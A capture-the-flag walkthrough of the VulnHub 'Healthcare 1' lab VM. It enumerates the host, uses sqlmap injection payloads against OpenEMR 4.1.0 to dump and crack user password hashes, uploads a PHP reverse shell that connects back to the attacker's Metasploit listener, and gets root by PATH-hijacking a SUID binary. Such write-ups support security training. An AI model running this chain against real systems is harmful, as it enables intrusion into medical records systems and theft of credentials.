
# Healthcare 1 - CTF

Available on VulnHub: https://www.vulnhub.com/entry/healthcare-1,522/


## IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.138   08:00:27:f9:79:2e      1      60  PCS Systemtechnik GmbH
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## Port Scanning

```
$ nmap -AT4 -p- 192.168.1.138
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-03 20:17 -03
Nmap scan report for 192.168.1.138
Host is up (0.00052s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3d
80/tcp open  http    Apache httpd 2.2.17 ((PCLinuxOS 2011/PREFORK-1pclos2011))
| http-robots.txt: 8 disallowed entries 
| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/ 
|_/all_our_e-mail_addresses /admin/ /
|_http-server-header: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)
|_http-title: Coming Soon 2
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.78 seconds
```

## Web Analysis

```
$ dirb http://192.168.1.138

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Apr  3 20:18:37 2021
URL_BASE: http://192.168.1.138/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.138/ ----
+ http://192.168.1.138/admin.cgi (CODE:403|SIZE:999)                                                                 
+ http://192.168.1.138/AT-admin.cgi (CODE:403|SIZE:999)                                                              
+ http://192.168.1.138/cachemgr.cgi (CODE:403|SIZE:999)                                                              
+ http://192.168.1.138/cgi-bin/ (CODE:403|SIZE:1013)                                                                 
==> DIRECTORY: http://192.168.1.138/css/                                                                             
+ http://192.168.1.138/favicon.ico (CODE:200|SIZE:1406)                                                              
==> DIRECTORY: http://192.168.1.138/fonts/                                                                           
==> DIRECTORY: http://192.168.1.138/gitweb/                                                                          
==> DIRECTORY: http://192.168.1.138/images/                                                                          
+ http://192.168.1.138/index (CODE:200|SIZE:5031)                                                                    
+ http://192.168.1.138/index.html (CODE:200|SIZE:5031)                                                               
==> DIRECTORY: http://192.168.1.138/js/                                                                              
+ http://192.168.1.138/phpMyAdmin (CODE:403|SIZE:59)                                                                 
+ http://192.168.1.138/robots (CODE:200|SIZE:620)                                                                    
+ http://192.168.1.138/robots.txt (CODE:200|SIZE:620)                                                                
+ http://192.168.1.138/server-info (CODE:403|SIZE:999)                                                               
+ http://192.168.1.138/server-status (CODE:403|SIZE:999)                                                             
==> DIRECTORY: http://192.168.1.138/vendor/                                                                          
                                                                                                                     
---- Entering directory: http://192.168.1.138/css/ ----
+ http://192.168.1.138/css/admin.cgi (CODE:403|SIZE:999)                                                             
+ http://192.168.1.138/css/AT-admin.cgi (CODE:403|SIZE:999)                                                          
+ http://192.168.1.138/css/cachemgr.cgi (CODE:403|SIZE:999)                                                          
+ http://192.168.1.138/css/main (CODE:200|SIZE:12155)                                                                
+ http://192.168.1.138/css/util (CODE:200|SIZE:83645)                                                                
                                                                                                                     
---- Entering directory: http://192.168.1.138/fonts/ ----
+ http://192.168.1.138/fonts/admin.cgi (CODE:403|SIZE:999)                                                           
+ http://192.168.1.138/fonts/AT-admin.cgi (CODE:403|SIZE:999)                                                        
+ http://192.168.1.138/fonts/cachemgr.cgi (CODE:403|SIZE:999)                                                        
                                                                                                                     
---- Entering directory: http://192.168.1.138/gitweb/ ----
+ http://192.168.1.138/gitweb/admin.cgi (CODE:403|SIZE:999)                                                          
+ http://192.168.1.138/gitweb/AT-admin.cgi (CODE:403|SIZE:999)                                                       
+ http://192.168.1.138/gitweb/cachemgr.cgi (CODE:403|SIZE:999)                                                       
                                                                                                                     
---- Entering directory: http://192.168.1.138/images/ ----
+ http://192.168.1.138/images/admin.cgi (CODE:403|SIZE:999)                                                          
+ http://192.168.1.138/images/AT-admin.cgi (CODE:403|SIZE:999)                                                       
+ http://192.168.1.138/images/cachemgr.cgi (CODE:403|SIZE:999)                                                       
==> DIRECTORY: http://192.168.1.138/images/icons/                                                                    
                                                                                                                     
---- Entering directory: http://192.168.1.138/js/ ----
+ http://192.168.1.138/js/admin.cgi (CODE:403|SIZE:999)                                                              
+ http://192.168.1.138/js/AT-admin.cgi (CODE:403|SIZE:999)                                                           
+ http://192.168.1.138/js/cachemgr.cgi (CODE:403|SIZE:999)                                                           
+ http://192.168.1.138/js/main (CODE:200|SIZE:2105)                                                                  
                                                                                                                     
---- Entering directory: http://192.168.1.138/vendor/ ----
+ http://192.168.1.138/vendor/admin.cgi (CODE:403|SIZE:999)                                                          
+ http://192.168.1.138/vendor/AT-admin.cgi (CODE:403|SIZE:999)                                                       
+ http://192.168.1.138/vendor/cachemgr.cgi (CODE:403|SIZE:999)                                                       
==> DIRECTORY: http://192.168.1.138/vendor/jquery/                                                                   
                                                                                                                     
---- Entering directory: http://192.168.1.138/images/icons/ ----
+ http://192.168.1.138/images/icons/admin.cgi (CODE:403|SIZE:999)                                                    
+ http://192.168.1.138/images/icons/AT-admin.cgi (CODE:403|SIZE:999)                                                 
+ http://192.168.1.138/images/icons/cachemgr.cgi (CODE:403|SIZE:999)                                                 
+ http://192.168.1.138/images/icons/favicon.ico (CODE:200|SIZE:32038)                                                
+ http://192.168.1.138/images/icons/logo (CODE:200|SIZE:1634)                                                        
                                                                                                                     
---- Entering directory: http://192.168.1.138/vendor/jquery/ ----
+ http://192.168.1.138/vendor/jquery/admin.cgi (CODE:403|SIZE:999)                                                   
+ http://192.168.1.138/vendor/jquery/AT-admin.cgi (CODE:403|SIZE:999)                                                
+ http://192.168.1.138/vendor/jquery/cachemgr.cgi (CODE:403|SIZE:999)                                                
                                                                                                                     
-----------------
END_TIME: Sat Apr  3 20:19:16 2021
DOWNLOADED: 41508 - FOUND: 41
```

```
$ nikto -h http://192.168.1.138

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.138
+ Target Hostname:    192.168.1.138
+ Target Port:        80
+ Start Time:         2021-04-03 20:18:47 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)
+ Server may leak inodes via ETags, header found with file /, inode: 264154, size: 5031, mtime: Sat Jan  6 04:21:38 2018
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ "robots.txt" contains 8 entries which should be manually viewed.
+ Apache/2.2.17 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
+ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 9543 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2021-04-03 20:20:48 (GMT-3) (121 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```
$ gobuster dir -t 50 -u http://192.168.1.138 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x .php,.txt,.js,/,.html --wildcard

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.138
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,js,/,html,php
[+] Timeout:                 10s
===============================================================
2021/04/03 20:28:13 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 342] [--> http://192.168.1.138/images/]
/index                (Status: 200) [Size: 5031]                                  
/index.html           (Status: 200) [Size: 5031]                                  
/css                  (Status: 301) [Size: 339] [--> http://192.168.1.138/css/]   
/js                   (Status: 301) [Size: 338] [--> http://192.168.1.138/js/]    
/vendor               (Status: 301) [Size: 342] [--> http://192.168.1.138/vendor/]
/favicon              (Status: 200) [Size: 1406]                                  
/robots.txt           (Status: 200) [Size: 620]                                   
/robots               (Status: 200) [Size: 620]                                   
/fonts                (Status: 301) [Size: 341] [--> http://192.168.1.138/fonts/] 
/gitweb               (Status: 301) [Size: 342] [--> http://192.168.1.138/gitweb/]
/server-status        (Status: 403) [Size: 999]                                   
/server-info          (Status: 403) [Size: 999]
/openemr              (Status: 301) [Size: 343] [--> http://192.168.1.138/openemr/]
===============================================================
2021/04/03 21:22:36 Finished
===============================================================
```

## OpenERM Page Analysis

In `http://192.168.1.138/openemr` page, we can find OpenERM version: **4.1.0**\
This version is vulnerable to SQL Injection: `https://www.exploit-db.com/exploits/17998`

## SQL Injection

I captured a login request with Burp.\
The URL parameter `u` hodlds the username.
```
$ cat login.req 

GET /openemr/interface/login/validateUser.php?u=admin HTTP/1.1
Host: 192.168.1.138
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://192.168.1.138/openemr/interface/login/login.php
```

Validating SQLi
```
$ sqlmap -r login.req -p u --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.5.3#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:47:26 /2021-04-03/

[20:47:26] [INFO] parsing HTTP request from 'login.req'
[20:47:27] [INFO] resuming back-end DBMS 'mysql' 
[20:47:27] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('OpenEMR=3e5d1ea2dcb...d61700ef6e'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: u (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: u=admin' AND 3930=3930 AND 'bweT'='bweT

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: u=admin' AND (SELECT 9423 FROM(SELECT COUNT(*),CONCAT(0x716b6a7671,(SELECT (ELT(9423=9423,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'ghYJ'='ghYJ

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: u=admin' AND (SELECT 9760 FROM (SELECT(SLEEP(5)))PtOF) AND 'vZpq'='vZpq
---
[20:47:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux
web application technology: PHP 5.3.3, Apache 2.2.17
back-end DBMS: MySQL >= 5.0
[20:47:29] [INFO] fetched data logged to text files under '/home/burton/.local/share/sqlmap/output/192.168.1.138'

[*] ending @ 20:47:29 /2021-04-03/
```

DB name acquired: `openemr`
```
$ sqlmap -r login.req -p u --batch --current-db

.
..
...
[20:52:58] [INFO] fetching current database
current database: 'openemr'
...
..
.
```

Tables for `openemr` acquired:
```
$ sqlmap -r login.req -p u --batch -D openemr --tables

.
..
...
Database: openemr
[141 tables]
+---------------------------------+
| array                           |
| groups                          |
| log                             |
| version                         |
| addresses                       |
| amc_misc_data                   |
| ar_activity                     |
| ar_session                      |
| audit_details                   |
| audit_master                    |
| automatic_notification          |
| batchcom                        |
| billing                         |
| categories                      |
| categories_seq                  |
| categories_to_documents         |
| chart_tracker                   |
| claims                          |
| clinical_plans                  |
| clinical_plans_rules            |
| clinical_rules                  |
| code_types                      |
| codes                           |
| config                          |
| config_seq                      |
| customlists                     |
| documents                       |
| documents_legal_categories      |
| documents_legal_detail          |
| documents_legal_master          |
| drug_inventory                  |
| drug_sales                      |
| drug_templates                  |
| drugs                           |
| eligibility_response            |
| eligibility_verification        |
| employer_data                   |
| enc_category_map                |
| extended_log                    |
| facility                        |
| fee_sheet_options               |
| form_dictation                  |
| form_encounter                  |
| form_misc_billing_options       |
| form_reviewofs                  |
| form_ros                        |
| form_soap                       |
| form_vitals                     |
| forms                           |
| gacl_acl                        |
| gacl_acl_sections               |
| gacl_acl_seq                    |
| gacl_aco                        |
| gacl_aco_map                    |
| gacl_aco_sections               |
| gacl_aco_sections_seq           |
| gacl_aco_seq                    |
| gacl_aro                        |
| gacl_aro_groups                 |
| gacl_aro_groups_id_seq          |
| gacl_aro_groups_map             |
| gacl_aro_map                    |
| gacl_aro_sections               |
| gacl_aro_sections_seq           |
| gacl_aro_seq                    |
| gacl_axo                        |
| gacl_axo_groups                 |
| gacl_axo_groups_map             |
| gacl_axo_map                    |
| gacl_axo_sections               |
| gacl_groups_aro_map             |
| gacl_groups_axo_map             |
| gacl_phpgacl                    |
| geo_country_reference           |
| geo_zone_reference              |
| globals                         |
| gprelations                     |
| history_data                    |
| immunizations                   |
| insurance_companies             |
| insurance_data                  |
| insurance_numbers               |
| integration_mapping             |
| issue_encounter                 |
| lang_constants                  |
| lang_custom                     |
| lang_definitions                |
| lang_languages                  |
| layout_options                  |
| lbf_data                        |
| list_options                    |
| lists                           |
| lists_touch                     |
| notes                           |
| notification_log                |
| notification_settings           |
| onotes                          |
| openemr_module_vars             |
| openemr_modules                 |
| openemr_postcalendar_categories |
| openemr_postcalendar_events     |
| openemr_postcalendar_limits     |
| openemr_postcalendar_topics     |
| openemr_session_info            |
| patient_access_offsite          |
| patient_access_onsite           |
| patient_data                    |
| patient_reminders               |
| payments                        |
| pharmacies                      |
| phone_numbers                   |
| pma_bookmark                    |
| pma_column_info                 |
| pma_history                     |
| pma_pdf_pages                   |
| pma_relation                    |
| pma_table_coords                |
| pma_table_info                  |
| pnotes                          |
| prescriptions                   |
| prices                          |
| procedure_order                 |
| procedure_report                |
| procedure_result                |
| procedure_type                  |
| registry                        |
| rule_action                     |
| rule_action_item                |
| rule_filter                     |
| rule_patient_data               |
| rule_reminder                   |
| rule_target                     |
| sequences                       |
| standardized_tables_track       |
| syndromic_surveillance          |
| template_users                  |
| transactions                    |
| user_settings                   |
| users                           |
| users_facility                  |
| x12_partners                    |
+---------------------------------+
...
..
.
```

Columns for table `users` acquired:
```


.
..
...
Database: openemr
Table: users
[53 columns]
+----------------------+--------------+
| Column               | Type         |
+----------------------+--------------+
| abook_type           | varchar(31)  |
| active               | tinyint(1)   |
| assistant            | varchar(255) |
| authorized           | tinyint(4)   |
| billname             | varchar(255) |
| cal_ui               | tinyint(4)   |
| calendar             | tinyint(1)   |
| city                 | varchar(30)  |
| city2                | varchar(30)  |
| default_warehouse    | varchar(31)  |
| email                | varchar(255) |
| facility             | varchar(255) |
| facility_id          | int(11)      |
| fax                  | varchar(30)  |
| federaldrugid        | varchar(255) |
| federaltaxid         | varchar(255) |
| fname                | varchar(255) |
| id                   | bigint(20)   |
| info                 | longtext     |
| irnpool              | varchar(31)  |
| lname                | varchar(255) |
| mname                | varchar(255) |
| newcrop_user_role    | varchar(30)  |
| notes                | text         |
| npi                  | varchar(15)  |
| organization         | varchar(255) |
| password             | longtext     |
| phone                | varchar(30)  |
| phonecell            | varchar(30)  |
| phonew1              | varchar(30)  |
| phonew2              | varchar(30)  |
| pwd_expiration_date  | date         |
| pwd_history1         | longtext     |
| pwd_history2         | longtext     |
| see_auth             | int(11)      |
| source               | tinyint(4)   |
| specialty            | varchar(255) |
| ssi_relayhealth      | varchar(64)  |
| state                | varchar(30)  |
| state2               | varchar(30)  |
| state_license_number | varchar(25)  |
| street               | varchar(60)  |
| street2              | varchar(60)  |
| streetb              | varchar(60)  |
| streetb2             | varchar(60)  |
| taxonomy             | varchar(30)  |
| title                | varchar(30)  |
| upin                 | varchar(255) |
| url                  | varchar(255) |
| username             | varchar(255) |
| valedictory          | varchar(255) |
| zip                  | varchar(20)  |
| zip2                 | varchar(20)  |
+----------------------+--------------+
...
..
.
```

2 Users crendentials acquired:
```
$ sqlmap -r login.req -p u --batch -D openemr -T users -C id,fname,mname,lname,username,password --dump

.
..
...
Database: openemr
Table: users
[2 entries]
+----+---------------+---------+---------------+----------+----------------------------------------------------+
| id | fname         | mname   | lname         | username | password                                           |
+----+---------------+---------+---------------+----------+----------------------------------------------------+
| 1  | Administrator | NULL    | Administrator | admin    | 3863efef9ee2bfbc51ecdca359c6302bed1389e8 (ackbar)  |
| 2  | PCLinuxOS     | <blank> | Medical       | medical  | ab24aed5a7c4ad45615cd7e0da816eea39e4895d (medical) |
+----+---------------+---------+---------------+----------+----------------------------------------------------+
...
..
.
```

Credential 1:
* User: **admin**
* Pass: **ackbar**

Credential 2:
* User: **medical**
* Pass: **medical**

Now we are able to access the `http://192.168.1.138/openemr/interface/login/login.php` page with admin credentials.

## OpenEMR Admin Page Access

I uploaded the PHP reverse shell file (`reverse_shell.php`) in `images` directory using the admin page.\
So I listened the connection in my host and called `http://192.168.1.138/openemr/sites/default/images/reverse_shell.php`.

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST 192.168.1.189

msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.189    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.1.189:4444 
[*] Command shell session 2 opened (192.168.1.189:4444 -> 192.168.1.138:35098) at 2021-04-03 21:17:10 -0300

sh-4.1$ id
uid=479(apache) gid=416(apache) groups=416(apache)
```

## Flag #1 - User

```
bash-4.1$ cat /home/almirant/user.txt
d41d8cd98f00b204e9800998ecf8427e
```

## Privilege Escalation

Looking for SUID binaries, we can find an unusual binary: `/usr/bin/healthcheck`
```
bash-4.1$ find / -type f -perm -u=s 2>/dev/null

/usr/libexec/pt_chown
/usr/lib/ssh/ssh-keysign
/usr/lib/polkit-resolve-exe-helper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/chromium-browser/chrome-sandbox
/usr/lib/polkit-grant-helper-pam
/usr/lib/polkit-set-default-helper
/usr/sbin/fileshareset
/usr/sbin/traceroute6
/usr/sbin/usernetctl
/usr/sbin/userhelper
/usr/bin/crontab
/usr/bin/at
/usr/bin/pumount
/usr/bin/batch
/usr/bin/expiry
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/wvdial
/usr/bin/pmount
/usr/bin/sperl5.10.1
/usr/bin/gpgsm
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/passwd
/usr/bin/gpg
/usr/bin/healthcheck        <<<<<
/usr/bin/Xwrapper
/usr/bin/ping6
/usr/bin/chsh
/lib/dbus-1/dbus-daemon-launch-helper
/sbin/pam_timestamp_check
/bin/ping
/bin/fusermount
/bin/su
/bin/mount
/bin/umount
```

The binary calls some linux commands, such as `ifconfig`, for example.
```
bash-4.1$ strings /usr/bin/healthcheck

/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
setuid
system
setgid
__libc_start_main
GLIBC_2.0
PTRhp
[^_]
clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h
```

The idea is to redirect relative `ifconfig` command.\
The date binary is comming from `/sbin/ifconfig`.\
We are able to redirect it editing the `PATH` environment to a modified `ifconfig` binary or script.
```
bash-4.1$ whereis ifconfig
ifconfig: /sbin/ifconfig /usr/share/man/man8/ifconfig.8.bz2

bash-4.1$ echo $PATH
/sbin:/usr/sbin:/bin:/usr/bin
```

Creating a `ifconfig` called script in `/tmp` directory with bash spawn command.
```
bash-4.1$ echo "/bin/bash" > /tmp/ifconfig
bash-4.1$ chmod +x /tmp/ifconfig
```

Now we need to add `/tmp` directory in `PATH` environment variable.\
It is important that it keep before the original `ifconfig` binary from `/sbin`.\
So we just have to add `/tmp` folder in the start of `PATH`.
```
bash-4.1$ export PATH=/tmp:$PATH
```

So when `/usr/bin/healthcheck` run, the `ifconfig` that will be executed will be our script.
```
bash-4.1$ /usr/bin/healthcheck

TERM environment variable not set.
System Health Check
Scanning System

[root@localhost tmp]# id
uid=0(root) gid=0(root) groups=0(root),416(apache)
```

## Flag #2 - Root

```
[root@localhost root]# cat /root/root.txt

██    ██  ██████  ██    ██     ████████ ██████  ██ ███████ ██████      ██   ██  █████  ██████  ██████  ███████ ██████  ██ 
 ██  ██  ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ ██ 
  ████   ██    ██ ██    ██        ██    ██████  ██ █████   ██   ██     ███████ ███████ ██████  ██   ██ █████   ██████  ██ 
   ██    ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██    
   ██     ██████   ██████         ██    ██   ██ ██ ███████ ██████      ██   ██ ██   ██ ██   ██ ██████  ███████ ██   ██ ██ 
                                                                                                                          
                                                                                                                          
Thanks for Playing!
Follow me at: http://v1n1v131r4.com

root hash: eaff25eaa9ffc8b62e3dfebf70e83a7b
```
